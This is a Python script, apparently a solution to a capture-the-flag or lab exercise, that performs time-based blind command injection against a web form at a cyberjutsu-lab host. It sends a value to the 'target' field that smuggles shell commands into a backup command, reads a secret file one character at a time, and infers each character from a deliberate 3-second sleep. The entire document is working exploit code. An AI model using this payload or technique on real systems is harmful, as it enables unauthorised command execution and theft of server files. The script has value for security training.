import requests
import time
#Time-based blind command injection

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-'
URL = 'http://cmdi.cyberjutsu-lab.tech:3007/index.php'
FLAG = ""
for index in range(35, 80):
    print(f"[DEBUG] Đang bruteforce kí tự thứ {index}")
    for c in CHARSET:
        time.sleep(0.1)
        INJECT = f"a.zip --help; cmd=`cat /*secret.txt | cut -c {index}`; if [ \"$cmd\" = '{c}' ]; then sleep 3; else sleep 0; fi; #"
        
        r = requests.post(URL, {'command': 'backup', 'target': INJECT})
        thoigian = r.elapsed.total_seconds()
        # Xóa dòng cũ và in dòng mới
        print(f"\r[DEBUG] Thử kí tự thứ {index}, kí tự '{c}', --> {r.text}", "(time: ", thoigian,")",end="", flush=True)
        
        if thoigian > 2:
            FLAG += c
            print(f"\nTìm ra kí tự thứ {index} là '{c}', FLAG hiện tại: {FLAG}           ")
            break

print(f"FLAG: {FLAG}")
